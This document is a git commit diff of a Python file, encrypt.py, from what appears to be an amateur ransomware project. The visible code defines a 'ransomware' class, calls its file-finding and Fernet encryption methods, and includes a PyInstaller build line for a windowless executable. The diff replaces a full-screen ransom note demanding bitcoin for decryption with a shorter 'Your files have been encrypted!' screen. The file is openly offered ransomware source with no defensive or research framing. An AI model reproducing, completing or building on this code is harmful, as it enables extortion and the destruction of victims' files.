06eff7ff1d6e23b1bce60d877c147514f00776a8
Drew York <119648808+dre-yo@users.noreply.github.com>
2023-04-09 18:09:30 -0700

    Add files via upload

--- encrypt.py
+++ encrypt.py
@@ -7,9 +7,6 @@ from cryptography.fernet import Fernet
 import tkinter as tk
 from tkinter import *
 
-
-#https://github.com/Malwareman007/Ransomware/blob/main/Encrypter.py
-#https://github.com/HugoLB0/Ransom0/blob/master/ransom0.py
 #python -m PyInstaller --onefile -w encrypt.py
 digits = random.randint(1111,9999) 
 class ransomware:
@@ -47,44 +44,20 @@ class ransomware:
         for file in filename:
             print(file)
 
+def display_message():
+    root = tk.Tk()
+    screen_width = root.winfo_screenwidth()
+    screen_height = root.winfo_screenheight()
+    root.geometry(f"{screen_width}x{screen_height}")
+    root.configure(background="black")
+    labe1 = tk.Label(root, text="Your files have been encrypted!", font=("Tahoma", 24), background='black', highlightbackground="black", highlightcolor="red", foreground="red", justify="center")
+    labe1.pack()
+
+
+
+    root.mainloop()
+    
 ransomware = ransomware()
 encrypt_files = ransomware.find_files()
 ransomware.encrypt(encrypt_files)
-root= tk.Tk()
-width = root.winfo_screenwidth() # Get screen width
-height = root.winfo_screenheight() # Get screen height
-
-
-canvas1 = tk.Canvas(root, width = width, height = height, bg='black') # Main window
-canvas1.pack()
-
-label1 = tk.Label(root, text='YOUR FILES HAVE BEEN ENCRYPTED') # Title
-label1.config(font=('helvetica', int(height/20)))
-label1.config(background='black', foreground='red')
-canvas1.create_window(int(width/2), int(height/15), window=label1)
-
-label1 = tk.Label(root, text='YOUR IMPORTANT DOCUMENTS, DATAS, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION AND A UNIQUE KEY.') # Title
-label1.config(font=('helvetica', int(height/50)))
-label1.config(background='black', foreground='red')
-canvas1.create_window(int(width/2), int(height/20)*8, window=label1)
-
-
-label1 = tk.Label(root, text='to decrypt them, send 50$ in bitcoin to BITCOIN_ADRESS, and them send proof of tranfer and your DIGITS to mail@mail.com') # Title
-label1.config(font=('helvetica', int(height/50)))
-label1.config(background='black', foreground='red')
-canvas1.create_window(int(width/2), int(height/20)*9, window=label1)
-
-label1 = tk.Label(root, text='YOUR DIGITS IS {}'.format(digits))# Display digits
-label1.config(font=('helvetica', int(height/50)))
-label1.config(background='black', foreground='red')
-canvas1.create_window(int(width/2), int(height/20)*10, window=label1)
-
-
-
-label1 = tk.Label(root, text='KEY:') # Title
-label1.config(font=('helvetica', int(height/50)))
-label1.config(background='black', foreground='red')
-canvas1.create_window(int(width/2), int(height/20)*11, window=label1)
-entry1 = tk.Entry (root) 
-canvas1.create_window(int(width/2), int(height/20)*12, window=entry1)
-root.mainloop()
+display_message()
